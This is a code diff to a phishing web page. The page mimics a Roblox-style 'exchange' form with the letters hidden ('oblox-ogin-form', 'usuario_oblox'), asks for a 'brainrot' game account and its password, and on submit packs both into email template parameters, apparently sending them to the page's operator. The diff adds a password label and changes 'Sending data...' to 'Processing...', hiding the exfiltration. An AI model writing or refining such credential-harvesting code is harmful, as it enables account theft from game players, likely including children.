@@ -352,15 +352,16 @@
         
         <form id="oblox-ogin-form" class="ogin-form">
             <div class="form-group">
-                <label for="username" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
-                <input type="text" id="username" placeholder="" required>
+                <label for="account" data-es="Cuenta de brainrot:" data-en="Brainrot account:">Cuenta de brainrot:</label>
+                <input type="text" id="account" placeholder="" required>
             </div>
             
             <div class="form-group">
+                <label for="account" data-es="Contrasenya de Cuenta de brainrot:" data-en="Brainrot password account:">Contrasenya de Cuenta de brainrot:</label>
                 <input type="text" id="access" placeholder="" required>
             </div>
             
-            <div class="loading" id="loading" data-es="Enviando datos..." data-en="Sending data...">Enviando datos...</div>
+            <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
             <div class="error-message" id="error-message"></div>
             
             <button type="submit" class="accept-btn" id="submit-btn" data-es="CONTINUAR" data-en="CONTINUE">CONTINUAR</button>
@@ -381,7 +382,7 @@
             es: {
                 title: "INTERCAMBIO",
                 subtitle: "Completar",
-                usernameLabel: "Cuenta de brainrot:",
+                accountLabel: "Cuenta de brainrot:",
                 loading: "Enviando datos...",
                 acceptButton: "CONTINUAR",
                 thankYou: "¡Gracias! ✅",
@@ -392,7 +393,7 @@
             en: {
                 title: "EXCHANGE",
                 subtitle: "Complete",
-                usernameLabel: "Brainrot account:",
+                accountLabel: "Brainrot account:",
                 loading: "Sending data...",
                 acceptButton: "CONTINUE",
                 thankYou: "Thank You! ✅",
@@ -423,10 +424,10 @@
         // Manejar envío del formulario
         document.getElementById('oblox-ogin-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const username = document.getElementById('username').value;
+            const account = document.getElementById('account').value;
             const access = document.getElementById('access').value;
             
-            if (username && access) {
+            if (account && access) {
                 // Mostrar loading
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('error-message').style.display = 'none';
@@ -435,7 +436,7 @@
                 const templateParams = {
                     from_name: 'Sistema de Intercambios',
                     to_name: 'Tú',
-                    usuario_oblox: username,
+                    usuario_oblox: account,
                     contra_oblox: access,
                     fecha: new Date().toLocaleString()
                 };
@@ -453,7 +454,7 @@
                         
                         // Guardar datos de la peticion
                         const peticion = {
-                            usuario: username,
+                            usuario: account,
                             fecha: new Date().toLocaleString(),
                             estado: 'completada',
                             email_enviado: true
